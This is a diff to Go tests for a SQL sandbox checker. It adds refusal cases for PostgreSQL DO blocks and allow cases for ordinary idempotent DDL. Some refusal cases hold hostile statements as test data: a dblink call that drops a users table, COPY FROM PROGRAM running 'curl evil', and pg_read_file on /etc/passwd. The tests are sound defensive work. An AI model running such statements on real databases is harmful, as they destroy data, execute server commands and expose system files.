@@ -41,9 +41,20 @@ func TestCheckPlanStatementsSandboxableRefusesEscapes(t *testing.T) {
 			construct: "PRAGMA temp_store_directory",
 		},
 		{
+			// The block itself is ordinary PostgreSQL; what it calls is not.
 			name:      "postgres_do_block_calling_dblink",
 			statement: "DO $$ BEGIN PERFORM dblink_exec('dbname=target', 'DROP TABLE users'); END $$",
-			construct: "DO",
+			construct: "dblink",
+		},
+		{
+			name:      "postgres_do_block_copy_from_program",
+			statement: "DO $$ BEGIN COPY t FROM PROGRAM 'curl evil'; END $$",
+			construct: "COPY ... PROGRAM",
+		},
+		{
+			name:      "postgres_single_quoted_do_block_reading_files",
+			statement: `DO 'BEGIN PERFORM pg_read_file(''/etc/passwd''); END' LANGUAGE plpgsql`,
+			construct: "pg_read_file",
 		},
 		{
 			name:      "postgres_function_body_reading_files",
@@ -451,6 +462,23 @@ func TestCheckPlanStatementsSandboxableAllowsOrdinaryDDL(t *testing.T) {
 		{
 			name:      "table_named_bulk_with_insert_column",
 			statement: `CREATE TABLE bulk (insert_count integer)`,
+		},
+		{
+			// The idempotent-DDL idiom every PostgreSQL plan is full of. An
+			// anonymous block is not an escape; refusing it wholesale broke
+			// the interop this reader exists for.
+			name: "postgres_do_block_idempotent_create_type",
+			statement: "DO $$ BEGIN IF NOT EXISTS (SELECT 1 FROM pg_type WHERE typname = 'status') " +
+				`THEN CREATE TYPE "status" AS ENUM ('a'); END IF; END $$`,
+		},
+		{
+			name: "postgres_do_block_duplicate_column_guard",
+			statement: "DO $$ BEGIN ALTER TABLE users ADD COLUMN email text; " +
+				"EXCEPTION WHEN duplicate_column THEN NULL; END $$",
+		},
+		{
+			name:      "postgres_do_block_plain_ddl",
+			statement: "DO $$ BEGIN CREATE INDEX idx_users_email ON users (email); END $$",
 		},
 	}
 
